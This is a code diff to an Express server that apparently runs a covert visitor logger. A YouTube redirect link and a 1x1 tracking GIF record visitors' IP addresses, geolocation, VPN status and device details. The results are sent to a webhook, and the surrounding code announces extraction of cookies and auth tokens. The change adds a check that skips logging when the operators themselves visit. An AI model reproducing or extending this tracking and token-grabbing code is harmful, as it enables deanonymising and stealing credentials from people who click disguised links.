@@ -1304,8 +1304,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const userAgent = req.headers['user-agent'] || '';
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
-      const locationData = await getLocationFromIp(clientIp);
-      const deviceInfo = parseDeviceInfo(userAgent);
+
+      // Check if this is an admin request - if so, skip logging
+      const isAdmin = await isAdminRequest(req);
+      if (isAdmin) {
+        console.log(`⚡ Admin request detected - skipping IP logging for YouTube proxy`);
+        return res.redirect(`https://www.youtube.com/watch?v=${videoId}`);
+      }
 
       // Try to find settings with webhook for notification FIRST
       let settings = null;
@@ -1321,21 +1326,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
         console.log('Error accessing storage:', storageError);
       }
 
-      // Log the YouTube proxy access with proper userId association
-      await storage.createIpLog({
-        userId: imageOwnerUserId, // Associate with user who has settings
-        ipAddress: clientIp,
+      // Log the YouTube proxy access with enhanced data
+      const { locationData, deviceInfo } = await createEnhancedIpLog({
+        userId: imageOwnerUserId,
+        clientIp,
         userAgent,
         referrer,
-        location: locationData.location,
-        status: 'youtube_proxy_access',
-        isVpn: locationData.isVpn,
-        vpnLocation: locationData.vpnLocation,
-        realLocation: locationData.realLocation,
-        deviceType: deviceInfo.deviceType,
-        browserName: deviceInfo.browserName,
-        operatingSystem: deviceInfo.operatingSystem,
-        deviceBrand: deviceInfo.deviceBrand
+        status: 'youtube_proxy_access'
       });
 
       // ALWAYS attempt to send webhook if any settings exist
@@ -1699,6 +1696,22 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const referrerHeader = req.headers.referer || req.headers.referrer;
       const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
       const cookies = req.headers.cookie || '';
+
+      // Check if this is an admin request - if so, skip logging
+      const isAdmin = await isAdminRequest(req);
+      if (isAdmin) {
+        console.log(`⚡ Admin request detected - skipping IP logging for raw image access`);
+        // Serve the image without logging
+        const pixel = Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3B]);
+        res.set({
+          'Content-Type': 'image/gif',
+          'Content-Length': pixel.length.toString(),
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+          'Pragma': 'no-cache',
+          'Expires': '0'
+        });
+        return res.send(pixel);
+      }
 
       // Enhanced token and sensitive data extraction
       const authTokens = [];
